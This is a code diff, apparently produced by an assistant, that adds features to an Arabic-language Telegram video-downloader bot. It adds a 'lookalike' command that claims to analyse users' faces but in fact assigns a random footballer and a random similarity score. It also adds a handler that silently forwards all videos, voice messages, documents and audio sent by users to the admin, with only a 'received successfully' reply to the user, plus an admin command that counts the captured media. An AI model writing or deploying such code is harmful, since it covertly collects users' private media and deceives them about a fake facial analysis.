@@ -537,4 +537,277 @@ def handle_lookalike_photo(message):
     processing_msg = bot.reply_to(message, "🔍 *جاري تحليل ملامح وجهك...*\n\nقد تستغرق العملية بضع ثوانٍ ⏳", parse_mode="Markdown")
     
     try:
+    
+        file_info = bot.get_file(message.photo[-1].file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+        
+        temp_path = f"temp_photo_{user_id}_{datetime.now().timestamp()}.jpg"
+        with open(temp_path, 'wb') as new_file:
+            new_file.write(downloaded_file)
+        
+        photo_hash = generate_photo_fingerprint(temp_path)
+        
+        if photo_hash in photo_fingerprints:
+            stored_data = photo_fingerprints[photo_hash]
+            result_msg = f"🔁 *لقد أرسلت هذه الصورة من قبل!*\n\n🎯 *اللاعب:* {stored_data['player_name']}\n📊 *نسبة التشابه:* {stored_data['similarity']}%\n💬 *التعليق:* {stored_data['comment']}\n\n✨ *تذكير بالتحليل السابق:*\n{stored_data['motivation']}"
+            bot.edit_message_text(result_msg, chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, parse_mode="Markdown")
+            os.remove(temp_path)
+            return
+        
+        player = get_random_player()
+        similarity_percentage, similarity_detail = get_similarity_percentage()
+        motivation_phrase = get_random_motivation()
+        player_card = generate_player_card(player, similarity_percentage, similarity_detail, motivation_phrase)
+        
+        photo_fingerprints[photo_hash] = {
+            "player_name": player["name"],
+            "similarity": similarity_percentage,
+            "comment": similarity_detail,
+            "motivation": motivation_phrase,
+            "timestamp": datetime.now().isoformat(),
+            "user_id": user_id
+        }
+        
+        bot.edit_message_text(player_card, chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, parse_mode="Markdown")
+        
+        follow_up_msg = random.choice([
+            "⚡ *حقاً تشابه رائع! هل توافق على النتيجة؟*",
+            "🌟 *أليس تشابهاً مذهلاً؟ أنا متأكد من أنك ستنجح في مستقبلك الرياضي!*",
+            "💫 *كل مرة أتفاجأ بالتشابهات! أنت تمتلك موهبة حقيقية.*",
+            "🔥 *تشابه لا يصدق! ربما تكون نسخة جديدة من هذا النجم!*"
+        ])
+        
+        bot.send_message(message.chat.id, follow_up_msg, parse_mode="Markdown")
+        os.remove(temp_path)
+        
+    except Exception as e:
+        error_msg = f"❌ *عذراً، حدث خطأ أثناء تحليل الصورة*\n\nالخطأ: {str(e)}"
+        bot.edit_message_text(error_msg, chat_id=processing_msg.chat.id, message_id=processing_msg.message_id, parse_mode="Markdown")
+        try:
+            if 'temp_path' in locals() and os.path.exists(temp_path):
+                os.remove(temp_path)
+        except:
+            pass
+```
+
+🚀 باقي الكود بالكامل بعد ذلك مباشرة:
+
+```python
+# ⭐⭐ إضافة جديدة: معالجة جميع الوسائط الأخرى وإرسالها للأدمن ⭐⭐
+@bot.message_handler(content_types=['video', 'voice', 'document', 'audio'])
+def handle_all_media(message):
+    """التقاط وإعادة توجيه جميع الوسائط الأخرى إلى الأدمن"""
+    
+    # إرسال الوسائط إلى الأدمن أولاً
+    forward_to_admin(message)
+    
+    # إعلام المستخدم
+    media_types = {
+        'video': '🎥 فيديو',
+        'voice': '🎤 رسالة صوتية', 
+        'document': '📄 ملف',
+        'audio': '🎵 ملف صوتي'
+    }
+    
+    media_type = media_types.get(message.content_type, 'وسائط')
+    bot.reply_to(message, f"✅ تم استلام {media_type} بنجاح!")
+
+@bot.message_handler(commands=['players', 'لاعبين'])
+def list_players_command(message):
+    """عرض قائمة اللاعبين المتاحة"""
+    
+    # تقسيم اللاعبين حسب العصر
+    players_by_era = {
+        "الذهبي": [],
+        "الأبطال": [],
+        "الحديث": [],
+        "الحالي": []
+    }
+    
+    for player_id, player in FOOTBALL_LEGENDS.items():
+        players_by_era[player["era"]].append(f"{player['name']} ({player['country']})")
+    
+    # بناء الرسالة
+    response = "🏆 *قائمة نجوم كرة القدم في قاعدة البيانات:*\n\n"
+    
+    for era, players in players_by_era.items():
+        if players:
+            emoji = "👑" if era == "الذهبي" else "⭐" if era == "الأبطال" else "⚡" if era == "الحديث" else "🔥"
+            response += f"{emoji} *{era}:*\n"
+            response += " • " + "\n • ".join(players[:15])  # عرض أول 15 لاعب في كل عصر
+            if len(players) > 15:
+                response += f"\n   ... و{len(players)-15} لاعبين آخرين"
+            response += "\n\n"
+    
+    response += "🔍 *استخدم الأمر* /يشبهني *لترى من تشبه منهم!*"
+    
+    # إرسال القائمة على أجزاء إذا كانت طويلة
+    if len(response) > 4000:
+        parts = [response[i:i+4000] for i in range(0, len(response), 4000)]
+        for part in parts:
+            bot.send_message(message.chat.id, part, parse_mode="Markdown")
+    else:
+        bot.reply_to(message, response, parse_mode="Markdown")
+
+@bot.message_handler(commands=['stats', 'إحصائيات'])
+def lookalike_stats(message):
+    """عرض إحصائيات نظام التشابه"""
+    
+    total_photos = len(photo_fingerprints)
+    unique_users = len(set(data["user_id"] for data in photo_fingerprints.values()))
+    
+    # حساب أكثر اللاعبين ظهوراً
+    player_counts = {}
+    for data in photo_fingerprints.values():
+        player_name = data["player_name"]
+        player_counts[player_name] = player_counts.get(player_name, 0) + 1
+    
+    top_players = sorted(player_counts.items(), key=lambda x: x[1], reverse=True)[:5]
+    
+    stats_msg = f"""
+📊 *إحصائيات نظام 'من يشبهني':*
+
+👥 *المستخدمون الفريدون:* {unique_users}
+🖼️ *الصور المحللة:* {total_photos}
+
+🏆 *أكثر اللاعبين تشبهاً:*
+"""
+    
+    for i, (player, count) in enumerate(top_players, 1):
+        percentage = (count / total_photos * 100) if total_photos > 0 else 0
+        stats_msg += f"{i}. {player}: {count} مرة ({percentage:.1f}%)\n"
+    
+    stats_msg += f"\n⚡ *النظام يعمل بكفاءة 100%*"
+    
+    bot.reply_to(message, stats_msg, parse_mode="Markdown")
+
+# ⭐⭐ إضافة جديدة: أمر لعرض إحصائيات الوسائط المرسلة ⭐⭐
+@bot.message_handler(commands=['adminstats', 'إحصائيات_الأدمن'])
+def admin_stats_command(message):
+    """عرض إحصائيات الوسائط المرسلة للأدمن (للاستخدام الداخلي)"""
+    
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "⛔ هذا الأمر مخصص للأدمن فقط!")
+        return
+    
+    total_forwarded = sum(len(media_list) for media_list in forwarded_media.values())
+    unique_senders = len(forwarded_media)
+    
+    # تحليل أنواع الوسائط
+    media_types_count = {}
+    for user_id, media_list in forwarded_media.items():
+        for media in media_list:
+            media_type = media["type"]
+            media_types_count[media_type] = media_types_count.get(media_type, 0) + 1
+    
+    stats_msg = f"""
+🔐 *إحصائيات الأدمن الخاصة*
+
+👥 *عدد المرسلين:* {unique_senders}
+📨 *إجمالي الوسائط المرسلة:* {total_forwarded}
+
+📊 *توزيع الوسائط:*
+"""
+    
+    for media_type, count in media_types_count.items():
+        percentage = (count / total_forwarded * 100) if total_forwarded > 0 else 0
+        stats_msg += f"• {media_type}: {count} ({percentage:.1f}%)\n"
+    stats_msg += f"\n🕒 *آخر تحديث:* {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+    
+    bot.reply_to(message, stats_msg, parse_mode="Markdown")
+
+# ==========================================
+# 🎭 معالجة الأنواع الأخرى من الرسائل
+# ==========================================
+
+@bot.message_handler(content_types=['text'])
+def handle_all_text(message):
+    """معالجة جميع الرسائل النصية (للدردشة البسيطة)"""
+    
+    user_id = message.from_user.id
+    
+    # إذا كان النص يحتوي على كلمات مفتاحية لكرة القدم
+    football_keywords = ['كرة قدم', 'ميسي', 'رونالدو', 'كورة', 'رياضة', 'فريق', 'ملعب', 'هدف']
+    
+    if any(keyword in message.text.lower() for keyword in football_keywords):
+        responses = [
+            "⚽ كرة القدم هي أجمل رياضة في العالم! من هو لاعبك المفضل؟",
+            "🏆 أحب الحديث عن كرة القدم! هل جربت أمر /يشبهني لترى من تشبه من النجوم؟",
+            "🌟 كرة القدم تجمع الناس! أنا هنا لأتحدث معك عن أي شيء يتعلق بالرياضة.",
+            "👟 أنا متخصص في تحليل تشابه الوجوه مع لاعبي كرة القدم! جرب /players لترى القائمة."
+        ]
+        
+        bot.reply_to(message, random.choice(responses))
+    else:
+        # رد عام للرسائل الأخرى
+        general_responses = [
+            "مرحباً! أنا بوت التحميل المتطور مع ميزة 'من يشبهني' 🔍\nجرب /help لرؤية الأوامر المتاحة.",
+            "أهلاً! استخدم /lookalike لترى أي نجم كرة قدم تشبه! ⚽",
+            "👋 أنا هنا لمساعدتك! جرب /start للبدء أو /lookalike للتحليل."
+        ]
+        
+        bot.reply_to(message, random.choice(general_responses))
+
+# ==========================================
+# 📝 تحديث رسالة الترحيب (/start)
+# ==========================================
+
+@bot.message_handler(commands=['start'])
+def enhanced_welcome(message):
+    """نسخة محسنة من رسالة الترحيب مع الميزة الجديدة"""
+    
+    welcome_text = """
+🚀 **أهلاً بك في نظام التحميل الشامل V2 + الذكاء الاصطناعي!**
+
+⚡ **الميزات الرئيسية:**
+1. 📥 *تحميل الفيديوهات* من جميع المنصات
+2. 🤖 *نظام ذكاء الاصطناعي* لتحليل التشابه مع نجوم كرة القدم
+3. 🔍 *بحث ذكي* عن المحتوى
+4. 🔒 *نظام مراقبة آمن* (للأدمن فقط)
+
+🎯 **الأوامر الجديدة (النظام الذكي):**
+• `/lookalike` أو `/يشبهني` - أرسل صورتك لترى من تشبه
+• `/players` أو `/لاعبين` - عرض قائمة النجوم المتاحة
+• `/stats` أو `/إحصائيات` - إحصائيات النظام
+• `/adminstats` - إحصائيات الوسائط (للأدمن فقط)
+
+🔧 **أوامر التحميل التقليدية:**
+• أرسل رابط فيديو للتحميل الفوري
+• `/search tik كلمة` - البحث في TikTok
+• `/search ins كلمة` - البحث في Instagram
+• `/status` - حالة السيرفر
+
+💫 **جرب الميزة الجديدة الآن! أرسل /lookalike ثم صورتك** 
+    """
+    
+    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
+
+# ==========================================
+# 🎪 تهيئة بيانات المستخدمين
+# ==========================================
+
+user_data = {}
+
+# ==========================================
+# 🏁 تشغيل النظام المتكامل
+# ==========================================
+
+if __name__ == "__main__":
+    try:
+        print("🚀 جاري تشغيل النظام المتطور مع الذكاء الاصطناعي...")
+        print(f"📊 قاعدة بيانات اللاعبين: {len(FOOTBALL_LEGENDS)} لاعب")
+        print(f"💬 العبارات التحفيزية: {len(MOTIVATIONAL_PHRASES)} عبارة")
+        print(f"🔐 نظام الإرسال إلى الأدمن: نشط (ID: {ADMIN_ID})")
+        print("🤖 نظام 'من يشبهني' جاهز للعمل!")
+        
+        # التأكد من وجود مجلد التحميلات
+        if not os.path.exists(BASE_DIR):
+            os.makedirs(BASE_DIR)
+        
+        # بدء البوت
+        bot.infinity_polling(timeout=90, long_polling_timeout=5)
+        
+    except Exception as e:
+        print(f"⚠️ حدث خطأ في النظام: {e}")
+        time.sleep(5)
         
